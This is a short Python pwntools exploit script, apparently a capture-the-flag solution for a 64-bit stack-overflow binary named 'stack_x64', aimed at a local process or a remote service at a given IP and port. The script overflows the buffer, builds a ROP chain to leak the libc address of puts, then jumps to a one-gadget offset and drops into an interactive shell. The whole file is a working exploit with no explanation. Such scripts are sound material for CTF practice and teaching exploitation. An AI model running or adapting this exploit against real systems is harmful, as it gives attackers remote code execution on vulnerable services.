#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./stack_x64"
elf=ELF(pwn_file)
libc=elf.libc

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("192.168.210.11",11002)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

conn.recvline()
f=[
    "a"*0x28,
    p64(0x4006FA),
    p64(0),
    p64(1),
    p64(elf.got["puts"]),
    p64(0),
    p64(0),
    p64(elf.got["puts"]),
    p64(0x4006E0),
    "\x00"*56,
    p64(0x400636),
]
conn.sendline("".join(f))
libc.address=u64(conn.recvline()[:-1].ljust(8,"\x00"))-libc.sym["puts"]

print "[+] libc_addr: %s" % (hex(libc.address))

f=[
    "a"*0x28,
    # p64(libc.address+0x4526a),
    p64(libc.address+0x10a38c),
    "\x00"*0x70,
]
conn.sendline("".join(f))
conn.interactive()
